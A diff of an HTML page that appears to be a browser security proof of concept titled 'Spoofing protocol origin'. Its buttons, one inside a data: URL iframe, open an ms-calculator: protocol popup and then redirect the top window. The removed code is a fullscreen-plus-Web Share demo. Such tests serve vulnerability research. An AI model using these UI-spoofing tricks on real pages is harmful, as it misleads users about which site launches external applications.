@@ -1,67 +1,18 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Redirect</title>
+</head>
+
 <body>
-
-
-
-
-<div style="margin-top:30%;margin-left:20%"><button onclick="g();">Double Tap here...</button></div>
-
-
+    <h1>Spoofing protocol origin</h1>
+    <button onclick='window.open(`ms-calculator:`,  `PopupWindow`, `width=450, height=175, left=650, top=250`);window.top.location.href = `https://www.mozilla.org/`;'>test</button>
+    <br><br>
+    <iframe
+        src="data:text/html,<button onclick='window.open(`ms-calculator:`,  `PopupWindow`, `width=450, height=150, left=650, top=250`);window.top.location.href = `https://www.mozilla.org/`;'>test spoof</button>"></iframe>
 </body>
-
-<script>
-var i=0;
-
-function g()
-{
-
-  if(i==0)
-  {
-     document.body.requestFullscreen();
-	 i++;
-  }
-  if(i>0)
-  {
-  /*  if (navigator.share) {  
-   navigator.share({
-      title: 'WebShare API Demo',
-      url: 'https://codepen.io/ayoisaiah/pen/YbNazJ'
-    }).then(() => {
-      console.log('Thanks for sharing!');
-    })
-    .catch(console.error); 
-   }*/
-
-  // if (navigator.share) { 
-  // document.body.requestFullscreen();
-   navigator.share({
-      title: 'WebShare API Demo',
-      url: 'https://codepen.io/ayoisaiah/pen/YbNazJ'
-    }).then(() => {
-      console.log('Thanks for sharing!');
-    })
-    .catch(console.error);
-  //  } else {
-       // shareDialog.classList.add('is-open');
-   // }
-  
- }
-	
-
-
-
-
-
-}
-
-
-</script>
-
-
-
-
-
-
-
 
 </html>
